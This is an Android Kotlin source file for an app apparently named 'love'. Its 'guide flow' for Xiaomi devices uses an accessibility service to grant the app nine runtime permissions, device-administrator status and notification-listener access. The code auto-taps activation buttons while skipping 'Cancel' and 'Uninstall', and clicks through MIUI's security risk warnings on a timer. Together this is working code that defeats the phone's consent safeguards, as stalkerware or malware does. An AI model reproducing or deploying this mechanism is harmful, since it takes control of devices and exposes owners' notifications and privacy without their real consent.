package com.zaka.screenagent.flow

import android.app.Activity
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.zaka.screenagent.accessibility.BoundaryAccessibilityService
import com.zaka.screenagent.admin.MoyingAdminReceiver
import com.zaka.screenagent.perm.MiuiNavigator
import com.zaka.screenagent.perm.PermissionClicker
import com.zaka.screenagent.perm.PermissionFlow

/**
 * ─────────────── 小米（MIUI / HyperOS / Redmi / POCO）引导脚本 ───────────────
 *
 * 一个文件就是一整套流程，按顺序像脚本一样读：
 *
 *   start()
 *     ├─ step1_权限()        申请 9 项运行时权限，自动点「允许」
 *     ├─ step2_设备管理()    打开激活页 → 点「激活」→ 危险页（2s 勾选 / 10s 确定）
 *     └─ step3_收尾()        校验 isAdminActive → 结束（通知/电池暂不做）
 *
 * 每一步的具体实现都在本文件下方，不依赖其它厂商的任何代码。
 * 以后加步骤就在 start() 里插一行，其它文件不用动。
 */
object MiuiFlow : VendorFlow {

    private const val TAG = "Flow(MIUI)"
    private val ui = Handler(Looper.getMainLooper())

    // ───────────────────────────── 主流程 ─────────────────────────────

    override fun start(service: BoundaryAccessibilityService, noAutoClick: Boolean) {
        Log.d(TAG, "===== MIUI 引导开始 =====")
        // 与本流程无关的通用接力全部关掉（小米只跑自己的两步）
        com.zaka.screenagent.admin.AdminActivator.chainToNotification = false
        com.zaka.screenagent.admin.AdminActivator.autoclick = !noAutoClick
        com.zaka.screenagent.notify.NotificationAccessActivator.autoclick = !noAutoClick
        com.zaka.screenagent.perm.PermissionActivity.chainToAdmin = false

        step1_权限(service) { granted ->
            if (!granted) {
                Log.w(TAG, "step1 未拿到全部权限，仍继续尝试设备管理")
            }
            step2_设备管理(service) { active ->
                step3_通知使用权(service) { granted ->
                    step4_收尾(active, granted)
                }
            }
        }
    }

    // ───────────────────── 公共：MIUI「危险」弹窗处理 ─────────────────────
    //
    // 无障碍 / 设备管理员 / 通知使用权 弹的都是同一个模板，所以统一封装：
    //   检测到 → 等 2 秒点「我已知晓」→ 再等 10 秒点「确定」→ 校验弹窗消失
    // 调用方只关心"有没有处理"。

    private fun passRiskIfAny(
        service: BoundaryAccessibilityService,
        where: String,
        onDone: (Boolean) -> Unit
    ) {
        if (!MiuiNavigator.onRiskDialog(service)) {
            Log.d(TAG, "$where: 无危险页")
            onDone(false)
            return
        }
        Log.d(TAG, "$where: 危险页 -> 2s 勾选 / 10s 确定")
        MiuiNavigator.passRiskDialog(service) { ok ->
            Log.d(TAG, "$where: 危险页处理=$ok")
            onDone(ok)
        }
    }

    // ─────────────────────── 第 1 步：运行时权限 ───────────────────────

    private fun step1_权限(service: BoundaryAccessibilityService, done: (Boolean) -> Unit) {
        Log.d(TAG, "step1: 申请运行时权限（缺 ${missing(service)} 项）")
        PermissionClicker.start(service)
        openPermissionActivity(service, 1)

        var tries = 0
        fun poll() {
            val m = missing(service)
            if (m == 0) {
                Log.d(TAG, "step1: 权限已全部授予")
                done(true); return
            }
            if (tries++ > 30) { Log.w(TAG, "step1: 超时，仍缺 $m 项"); done(false); return }
            ui.postDelayed({ poll() }, 2_000L)
        }
        ui.postDelayed({ poll() }, 2_000L)
    }

    /** 拉起权限页；12 秒还没拿全就再来一次（最多 3 次） */
    private fun openPermissionActivity(service: BoundaryAccessibilityService, attempt: Int) {
        if (missing(service) == 0) return
        Log.d(TAG, "step1: 打开权限页 attempt=$attempt")
        runCatching {
            service.startActivity(
                Intent(service, com.zaka.screenagent.perm.PermissionActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            )
        }.onFailure { Log.w(TAG, "step1: 打开权限页失败 $it") }
        // MIUI 会丢弃第一次后台启动的 Activity，所以 2 秒一次快速重试
        if (attempt < 6) {
            ui.postDelayed({ if (missing(service) > 0) openPermissionActivity(service, attempt + 1) }, 2_000L)
        }
    }

    private fun missing(service: BoundaryAccessibilityService): Int =
        PermissionFlow.PERMISSIONS.count {
            androidx.core.content.ContextCompat.checkSelfPermission(service, it) !=
                android.content.pm.PackageManager.PERMISSION_GRANTED
        }

    // ─────────────────────── 第 2 步：设备管理 ───────────────────────

    private fun step2_设备管理(service: BoundaryAccessibilityService, done: (Boolean) -> Unit) {
        Log.d(TAG, "step2: 打开设备管理激活页")
        runCatching {
            service.startActivity(
                Intent(service, MiuiAdminActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            )
        }.onFailure { Log.w(TAG, "step2: 打开激活页失败 $it") }

        // 危险页：一旦出现 → 2 秒勾「我已知晓」→ 10 秒点「确定」
        var ticks = 0
        fun watch() {
            if (MiuiNavigator.onRiskDialog(service)) {
                passRiskIfAny(service, "step2") { _ ->
                    val active = MoyingAdminReceiver.isActive(service)
                    Log.d(TAG, "step2: 管理员=$active")
                    done(active)
                }
                return
            }
            if (ticks++ > 60) { Log.w(TAG, "step2: 等危险页超时"); done(MoyingAdminReceiver.isActive(service)); return }
            ui.postDelayed({ watch() }, 1_500L)
        }
        ui.postDelayed({ watch() }, 4_000L)
    }

    // ─────────────────── 第 3 步：通知使用权（小米同款入口） ───────────────────

    /**
     * 小米的通知使用权入口：`ACTION_NOTIFICATION_LISTENER_SETTINGS`
     *   列表页（NotificationAccessSettingsActivity）→ 点「love」这一行
     *   → 详情页（NotificationAccessDetails）→ 点「授予通知使用权」开关
     *   → 若弹「危险」页 → 等 2 秒勾选 → 10 秒点确定
     *   → 校验 enabled_notification_listeners 是否包含本应用（系统有 ~10 秒绑定延迟）
     */
    private fun step3_通知使用权(service: BoundaryAccessibilityService, done: (Boolean) -> Unit) {
        if (com.zaka.screenagent.notify.NotificationAccessActivator.isGranted(service)) {
            Log.d(TAG, "step3: 通知使用权已授权，跳过")
            done(true); return
        }
        Log.d(TAG, "step3: 打开通知使用权设置页")
        var navTries = 0
        fun openPage() {
            runCatching {
                service.startActivity(
                    Intent(android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                )
            }.onFailure { Log.w(TAG, "step3: 打开设置页失败 $it") }
            if (++navTries < 4) ui.postDelayed({
                if (!com.zaka.screenagent.notify.NotificationAccessActivator.isGranted(service) &&
                    !isListOrDetail(service)) openPage()
            }, 2_000L)
        }
        openPage()

        // 列表页点自己那一行 → 详情页点开关 → 危险页 → 等待系统绑定
        var ticks = 0
        var rowClicked = false
        var toggleClicked = false
        fun drive() {
            if (com.zaka.screenagent.notify.NotificationAccessActivator.isGranted(service)) {
                Log.d(TAG, "step3: 已授权")
                done(true); return
            }
            // 危险页优先处理
            if (MiuiNavigator.onRiskDialog(service)) {
                passRiskIfAny(service, "step3") { ok -> Log.d(TAG, "step3: 继续 granted=${com.zaka.screenagent.notify.NotificationAccessActivator.isGranted(service)}") }
            } else if (!rowClicked) {
                val hit = MiuiNavigator.clickByText(service, appLabel(service), contains = false)
                if (hit) { rowClicked = true; Log.d(TAG, "step3: 点到自己那一行") }
            } else if (!toggleClicked) {
                var hit = false
                for (t in MiuiNavigator.NOTI_ACCESS_TEXTS) {
                    if (MiuiNavigator.clickByText(service, t, contains = true)) { hit = true; break }
                }
                if (!hit) hit = MiuiNavigator.clickAppSwitch(service)
                if (hit) { toggleClicked = true; Log.d(TAG, "step3: 点了允许开关") }
            }
            if (ticks++ > 40) {                       // ≈ 60 秒
                val g = com.zaka.screenagent.notify.NotificationAccessActivator.isGranted(service)
                Log.w(TAG, "step3: 超时 granted=$g")
                done(g); return
            }
            ui.postDelayed({ drive() }, 1_500L)
        }
        ui.postDelayed({ drive() }, 4_000L)
    }

    private fun isListOrDetail(service: BoundaryAccessibilityService): Boolean {
        val cls = runCatching { service.rootInActiveWindow?.className?.toString().orEmpty() }.getOrDefault("")
        return cls.contains("NotificationAccess") || cls.contains("SubSettings")
    }

    private fun appLabel(service: BoundaryAccessibilityService): String =
        runCatching {
            service.packageManager.getApplicationLabel(service.applicationInfo).toString()
        }.getOrDefault("love")

    // ───────────────────────── 第 4 步：收尾 ─────────────────────────

    private fun step4_收尾(adminActive: Boolean, notiGranted: Boolean) {
        Log.d(TAG, "step4: 管理员=$adminActive 通知使用权=$notiGranted -> 结束（电池未接）")
        Log.d(TAG, "===== MIUI 引导结束 =====")
    }
}

/**
 * 小米专用的设备管理激活页载体（同文件，不单独建类文件）。
 * 前台 Activity 才能拉起系统激活页（MIUI 拦后台启动），所以必须有它。
 */
class MiuiAdminActivity : Activity() {

    private val main = Handler(Looper.getMainLooper())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.d(TAG, "open activation page")
        runCatching {
            startActivityForResult(MoyingAdminReceiver.activationIntent(this, newTask = false), REQ)
        }.onFailure { Log.w(TAG, "launch activation page failed: $it"); finish() }
        main.postDelayed(tick, 600L)
        main.postDelayed(Runnable {
            if (!isFinishing) { Log.w(TAG, "timeout"); finish() }
        }, 90_000L)
    }

    private val tick = object : Runnable {
        private var n = 0
        override fun run() {
            if (isFinishing) return
            n++
            if (MoyingAdminReceiver.isActive(this@MiuiAdminActivity)) {
                Log.d(TAG, "admin active -> finish")
                finish(); return
            }
            if (clickActivate()) Log.d(TAG, "clicked 激活 (tick=$n)")
            main.postDelayed(this, 600L)
        }
    }

    /** 这一页的按钮文案（多语言）：MIUI 实际是「启用此设备管理应用」 */
    private val activateTexts = listOf(
        "启用此设备管理应用", "启用设备管理应用", "启用", "激活", "确定",
        "Activate this device admin app", "Activate", "Enable",
        "Activar esta aplicación de administración", "Activar",
        "Ativar este app de administração de dispositivo", "Ativar",
        "Aktifkan aplikasi admin perangkat ini", "Aktifkan",
        "Kích hoạt ứng dụng quản trị thiết bị này", "Kích hoạt"
    )
    private val cancelTexts = listOf("取消", "卸载应用", "Cancel", "Uninstall", "Cancelar", "Desinstalar")

    private fun clickActivate(): Boolean {
        val svc = BoundaryAccessibilityService.current() ?: return false
        val roots = ArrayList<AccessibilityNodeInfo>()
        runCatching { svc.windows.orEmpty().forEach { w -> w.root?.let { roots.add(it) } } }
        svc.rootInActiveWindow?.let { roots.add(it) }
        for (root in roots) {
            // ① 文案精确匹配（先 ACTION_CLICK，不行用手势）
            for (t in activateTexts) {
                byText(root, t, 0)?.let { node ->
                    if (!node.isEnabled) return@let
                    if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        Log.d(TAG, "clicked activate by click text=$t"); return true
                    }
                    if (tapByGesture(node)) {
                        Log.d(TAG, "clicked activate by gesture text=$t"); return true
                    }
                }
            }
            // ② 结构兜底：页面里第一个可点 Button，排除「取消 / 卸载应用」
            val btn = firstUsableButton(root, 0)
            if (btn != null) {
                if (btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    Log.d(TAG, "clicked activate by click(structure) text=${btn.text}"); return true
                }
                if (tapByGesture(btn)) {
                    Log.d(TAG, "clicked activate by gesture(structure) text=${btn.text}"); return true
                }
            }
        }
        return false
    }

    /** 按节点 bounds 中心点做一次手势点击（MIUI 的按钮 clickable=false，只能这么点） */
    private fun tapByGesture(node: AccessibilityNodeInfo): Boolean {
        val svc = BoundaryAccessibilityService.current() ?: return false
        val r = android.graphics.Rect()
        node.getBoundsInScreen(r)
        if (r.width() <= 0 || r.height() <= 0) return false
        val path = android.graphics.Path().apply { moveTo(r.exactCenterX(), r.exactCenterY()) }
        val stroke = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 80)
        val g = android.accessibilityservice.GestureDescription.Builder().addStroke(stroke).build()
        return svc.dispatchGesture(g, null, null)
    }

    private fun firstUsableButton(n: AccessibilityNodeInfo?, d: Int): AccessibilityNodeInfo? {
        if (n == null || d > 30) return null
        val cls = n.className?.toString().orEmpty()
        if (cls == "android.widget.Button" && n.isEnabled) {
            val t = n.text?.toString().orEmpty()
            if (cancelTexts.none { t.contains(it) }) return n
        }
        for (i in 0 until n.childCount) firstUsableButton(n.getChild(i), d + 1)?.let { return it }
        return null
    }

    private fun byId(n: AccessibilityNodeInfo?, suffix: String, d: Int): AccessibilityNodeInfo? {
        if (n == null || d > 30) return null
        if (n.viewIdResourceName.orEmpty().endsWith(suffix)) return n
        for (i in 0 until n.childCount) byId(n.getChild(i), suffix, d + 1)?.let { return it }
        return null
    }

    private fun byText(n: AccessibilityNodeInfo?, want: String, d: Int): AccessibilityNodeInfo? {
        if (n == null || d > 30) return null
        if (n.text?.toString() == want) return n
        for (i in 0 until n.childCount) byText(n.getChild(i), want, d + 1)?.let { return it }
        return null
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode != REQ) return
        Log.d(TAG, "activation result code=$resultCode active=${MoyingAdminReceiver.isActive(this)}")
        finish()
    }

    companion object {
        private const val TAG = "MiuiAdminActivity"
        private const val REQ = 1001
    }
}
